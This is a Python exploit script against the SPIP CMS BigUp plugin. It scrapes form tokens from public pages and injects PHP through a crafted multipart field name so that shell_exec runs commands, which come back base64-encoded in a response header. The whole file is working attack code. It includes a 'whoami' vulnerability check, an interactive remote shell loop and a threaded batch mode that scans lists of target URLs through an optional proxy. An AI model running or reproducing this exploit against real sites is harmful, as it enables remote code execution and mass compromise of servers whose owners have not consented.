import sys
import base64
import random
import string
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import concurrent.futures

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

class SpipBigUp:
    def __init__(self, base_url, proxy=None):
        self.base_url = base_url
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.headers = {"User-Agent": "Mozilla/5.0"}

    def print_msg(self, msg, type="info"):
        if type == "ok":
            print(f"[+] {msg}")
        elif type == "err":
            print(f"[-] {msg}")
        elif type == "warn":
            print(f"[!] {msg}")
        else:
            print(f"[*] {msg}")

    def get_form_action_args(self):
        parsed_url = urlparse(self.base_url)
        custom_path = parsed_url.path.lstrip("/")
        pages = [custom_path] if custom_path else []
        pages.extend(["login", "spip_pass", "contact"])

        for page in pages:
            url = f"{parsed_url.scheme}://{parsed_url.netloc}/{page}" if page == custom_path else f"{self.base_url}/spip.php?page={page}"
            try:
                r = requests.get(url, headers=self.headers, proxies=self.proxies, verify=False, timeout=5)
                if r.status_code != 200:
                    continue

                soup = BeautifulSoup(r.text, "html.parser")
                form = {
                    "action": soup.find("input", {"name": "formulaire_action"}),
                    "args": soup.find("input", {"name": "formulaire_action_args"})
                }

                form = {k: v.get("value") for k, v in form.items() if v}
                if len(form) == 2:
                    return form
            except Exception as e:
                self.print_msg(f"Failed to fetch from `{page}`: {e}", "err")
        return None

    def post_article_form(self, form_data, command):
        try:
            boundary = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            rn = ''.join(random.choices(string.ascii_letters, k=4))
            rf = ''.join(random.choices(string.ascii_letters, k=4))
            php = f'header("X-Command-Output: " . base64_encode(shell_exec(base64_decode("{command}"))))'.replace('"', '\\"')

            parts = [
                f'--{boundary}\r\nContent-Disposition: form-data; name="formulaire_action"\r\n\r\n{form_data["action"]}',
                f'--{boundary}\r\nContent-Disposition: form-data; name="bigup_retrouver_fichiers"\r\n\r\n1',
                f'--{boundary}\r\nContent-Disposition: form-data; name="{rn}[\' . {php} . die() . \']"; filename="{rf}"\r\nContent-Type: text/plain\r\n\r\nFile contents!',
                f'--{boundary}\r\nContent-Disposition: form-data; name="formulaire_action_args"\r\n\r\n{form_data["args"]}',
                f"--{boundary}--"
            ]
            body = "\r\n".join(parts)
            headers = self.headers.copy()
            headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"

            r = requests.post(self.base_url, data=body, headers=headers, proxies=self.proxies, verify=False, timeout=5)
            return r
        except:
            return None

    def execute_command(self, form_data, command):
        b64 = base64.b64encode(command.encode()).decode()
        r = self.post_article_form(form_data, b64)
        if r and r.status_code == 200:
            out = r.headers.get("X-Command-Output")
            if out:
                return base64.b64decode(out).decode()
        return None

    def check_vuln(self):
        form_data = self.get_form_action_args()
        if not form_data:
            return False, None
        output = self.execute_command(form_data, "whoami")
        return (True, output) if output else (False, None)

    def interactive_shell(self):
        form_data = self.get_form_action_args()
        if not form_data:
            self.print_msg("Failed to retrieve form data.", "err")
            return
        self.print_msg("Shell started. Type `exit` to quit.", "info")
        while True:
            try:
                cmd = input("$ ").strip()
                if cmd.lower() == "exit":
                    break
                if cmd == "clear":
                    print("\033c", end="")
                    continue
                output = self.execute_command(form_data, cmd)
                print(output if output else "[No Response]")
            except KeyboardInterrupt:
                break

def run_single(url, proxy=None):
    spip = SpipBigUp(url, proxy)
    is_vuln, output = spip.check_vuln()
    if is_vuln:
        spip.print_msg(f"Target is vulnerable! Output: {output}", "ok")
        spip.interactive_shell()
    else:
        spip.print_msg("Target is not vulnerable or no response.", "err")

def run_batch(file, threads, proxy=None):
    with open(file, "r") as f:
        urls = [line.strip() for line in f if line.strip()]

    def test_url(url):
        spip = SpipBigUp(url, proxy)
        is_vuln, output = spip.check_vuln()
        return url, is_vuln, output

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(test_url, u): u for u in urls}
        for i, future in enumerate(concurrent.futures.as_completed(futures), 1):
            url, is_vuln, output = future.result()
            if is_vuln:
                print(f"[{i}] [OK] {url} - {output}")
            else:
                print(f"[{i}] [--] {url} - Not vulnerable")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:\n  python3 spip_lab.py <url>\n  python3 spip_lab.py -f url_file")
        sys.exit(1)

    if sys.argv[1] == "-f":
        file = sys.argv[2]
        run_batch(file, threads=10)
    else:
        url = sys.argv[1]
        run_single(url)

